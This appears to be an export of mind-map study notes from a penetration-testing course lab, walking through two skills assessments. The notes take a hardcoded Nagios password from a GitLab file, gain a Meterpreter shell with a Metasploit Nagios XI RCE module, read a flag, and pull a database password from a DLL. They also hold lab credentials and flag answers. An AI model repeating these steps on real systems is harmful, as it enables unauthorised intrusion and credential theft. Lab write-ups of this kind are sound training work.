> **Source path:** Attacking Common Applications → Part 3 → Skills Assessment II → What is the admin password to access this application? → look in Nagios project in gitlab → Name 	Last commit 	Last update .gitignore 	Ignoring backup files 	17 years ago INSTALL 	Update INSTALL with master password 	4 years ago README 	Make README a bit more legible 	19 years ago check_pg_connections.pl 	Trapping execute error for curr_conn and reporting that error. 	17 years ago check_pg_lock_status.pl 	Initial Checkin of Code. 	19 years ago check_pg_max_xid.pl 	Initial Checkin of Code. 	19 years ago check_pg_queries.pl 	Added an INSTALL file since there were a number of assumptions I was making about the system. 	19 years ago check_pg_time.pl 	Initial Checkin of Code. 	19 years ago check_pg_waiting_queries.pl 	clean up some perl warnings, still not 100% though 	19 years ago pg_stat_activity.sql 	Added an INSTALL file since there were a number of assumptions I was making about the system. 	19 years ago → click on INSTALL → postgres=# CREATE USER nagiosadmin WITH PASSWORD 'oilaKglm7M09@CPL&amp;^lC'; CREATE USER
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 6c93d878-b594-4ac2-a3af-5e6f8c34cfea -->

> [!output]+ 🟨 Output 186
> NSP: Sorry Dave, I can't let you do that
>
> **Source path:** Attacking Common Applications → Part 3 → Skills Assessment II → What is the admin password to access this application? → look in Nagios project in gitlab → Name 	Last commit 	Last update .gitignore 	Ignoring backup files 	17 years ago INSTALL 	Update INSTALL with master password 	4 years ago README 	Make README a bit more legible 	19 years ago check_pg_connections.pl 	Trapping execute error for curr_conn and reporting that error. 	17 years ago check_pg_lock_status.pl 	Initial Checkin of Code. 	19 years ago check_pg_max_xid.pl 	Initial Checkin of Code. 	19 years ago check_pg_queries.pl 	Added an INSTALL file since there were a number of assumptions I was making about the system. 	19 years ago check_pg_time.pl 	Initial Checkin of Code. 	19 years ago check_pg_waiting_queries.pl 	clean up some perl warnings, still not 100% though 	19 years ago pg_stat_activity.sql 	Added an INSTALL file since there were a number of assumptions I was making about the system. 	19 years ago → click on INSTALL → postgres=# CREATE USER nagiosadmin WITH PASSWORD 'oilaKglm7M09@CPL&amp;^lC'; CREATE USER → login in http://monitoring.inlanefreight.local/ with nagiosadmin:oilaKglm7M09@CPL&amp;^lC → NSP: Sorry Dave, I can't let you do that
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 3d57bd87-e077-4a08-9000-9f61fce921d1 -->

> [!output]+ 🟨 Output 187
> Nagios XI 5.7.5
>
> **Source path:** Attacking Common Applications → Part 3 → Skills Assessment II → Obtain reverse shell access on the target and submit the contents of the flag.txt file. → after login check the Version number in footer → Nagios XI 5.7.5
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 77fe4774-3e29-4838-8879-91dcf79b8e29 -->

> [!output]+ 🟨 Output 188
> 0   Linux (x86)
>     1   Linux (x64)
> =&gt;  2   CMD
>
> **Source path:** Attacking Common Applications → Part 3 → Skills Assessment II → Obtain reverse shell access on the target and submit the contents of the flag.txt file. → MSF&gt; → search Nagios XI 5.7.5 → use linux/http/nagios_xi_configwizards_authenticated_rce → show targets → 0   Linux (x86)     1   Linux (x64) =&gt;  2   CMD
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 80f2e37a-8a05-4ac9-8431-7c0232a1dd2e -->

> [!output]+ 🟨 Output 189
> Meterpreter (/usr/local/nagiosxi/html/config)&gt;
>
> **Source path:** Attacking Common Applications → Part 3 → Skills Assessment II → Obtain reverse shell access on the target and submit the contents of the flag.txt file. → MSF&gt; → search Nagios XI 5.7.5 → use linux/http/nagios_xi_configwizards_authenticated_rce → run → Meterpreter (/usr/local/nagiosxi/html/config)&gt;
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: a0fc889c-a512-4ad4-9f47-7361d0c4f576 -->

> [!output]+ 🟨 Output 190
> afe377683dce373ec2bf7eaf1e0107eb
>
> **Source path:** Attacking Common Applications → Part 3 → Skills Assessment II → Obtain reverse shell access on the target and submit the contents of the flag.txt file. → MSF&gt; → search Nagios XI 5.7.5 → use linux/http/nagios_xi_configwizards_authenticated_rce → run → Meterpreter (/usr/local/nagiosxi/html/config)&gt; → cd ../admin → cat f5088a862528cbb16b4e253f1809882c_flag.txt → afe377683dce373ec2bf7eaf1e0107eb
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 2bf406e6-1bcb-4092-820d-22b5fe5bb464 -->

> [!output]+ 🟨 Output 191
> C:\inetpub\wwwroot\bin
>
> **Source path:** Attacking Common Applications → Part 3 → Skills Assessment III → What is the hardcoded password for the database connection in the MultimasterAPI.dll file? → RDP to target with username "Administrator" and password "xcyj8izxNVzhf4z" → Get-ChildItem -Path C:\ -Filter "MultimasterAPI.dll" -Recurse -ErrorAction SilentlyContinue → C:\inetpub\wwwroot\bin
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: c4f9a292-85a1-4a8e-b246-44b27fd773a9 -->

> [!output]+ 🟨 Output 192
> password=D3veL0pM3nT!
>
> **Source path:** Attacking Common Applications → Part 3 → Skills Assessment III → What is the hardcoded password for the database connection in the MultimasterAPI.dll file? → RDP to target with username "Administrator" and password "xcyj8izxNVzhf4z" → /TOOLS → only dnsspy → open it → invistigate under MultimasterAPI.dll → password=D3veL0pM3nT!
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 7fc87be6-eff0-4797-8135-f51636812aed -->
